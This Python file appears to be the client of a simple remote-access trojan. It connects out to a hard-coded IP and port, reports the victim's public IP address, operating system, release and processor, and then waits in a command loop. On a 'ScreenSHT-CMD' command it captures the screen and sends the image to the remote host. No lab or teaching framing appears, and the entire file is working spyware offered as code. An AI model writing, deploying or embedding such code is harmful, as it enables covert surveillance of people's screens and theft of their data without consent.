import socket
import platform
import requests
import os
from PIL import ImageGrab  # For taking screenshots

ip = "192.168.100.193"
port = 50000
address = (ip, port)

# Get the public IP address and strip any trailing whitespace (including newlines)
get_ip = requests.get('https://ipv4.icanhazip.com').text.strip()
get_os = platform.system()
get_release = platform.release()
arch = platform.processor()

get_total_os = f"{get_ip}&{get_os}&{get_release}&{arch}"
print(get_total_os)


def take_screenshot(file_path="ss.png"):
    screenshot = ImageGrab.grab()
    screenshot.save(file_path, "PNG")


def main():
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect(address)
        try:
            server_socket.send(get_total_os.encode('utf-8'))
        except socket.error as e:
            print(f"Error: {e}")
    except socket.error as e:
        print(f"Socket error: {e}")
        exit(1)
    
    while True:
        data = server_socket.recv(100000).decode("utf-8").strip()
        print("Command: " + data)
        
        if data == "ScreenSHT-CMD":
            # Take a screenshot and save it as ss.png
            take_screenshot("ss.png")
            
            with open("ss.png", "rb") as file:
                screenshot_data = file.read()
                server_socket.send(screenshot_data)


if __name__ == "__main__":
    main()